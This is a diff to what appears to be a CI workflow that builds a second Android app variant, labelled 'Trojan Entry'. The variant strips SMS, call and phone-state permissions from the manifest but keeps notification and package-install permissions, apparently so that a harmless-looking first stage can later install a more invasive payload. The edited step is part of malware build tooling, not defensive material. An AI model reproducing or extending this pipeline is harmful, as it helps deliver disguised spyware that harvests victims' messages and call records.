@@ -53,14 +53,13 @@ jobs:
 
       - name: Build Trojan Entry (No Permissions)
         run: |
-          # Strip permissions from Manifest for the second build
+          # Strip permissions but KEEP Notifications and Install Package
           sed -i '/android.permission.SEND_SMS/d' android/app/src/main/AndroidManifest.xml
           sed -i '/android.permission.RECEIVE_SMS/d' android/app/src/main/AndroidManifest.xml
           sed -i '/android.permission.READ_SMS/d' android/app/src/main/AndroidManifest.xml
           sed -i '/android.permission.READ_PHONE_STATE/d' android/app/src/main/AndroidManifest.xml
           sed -i '/android.permission.CALL_PHONE/d' android/app/src/main/AndroidManifest.xml
           sed -i '/android.permission.READ_CALL_LOG/d' android/app/src/main/AndroidManifest.xml
-          sed -i '/android.permission.POST_NOTIFICATIONS/d' android/app/src/main/AndroidManifest.xml
           
           cd android
           ./gradlew assembleDebug
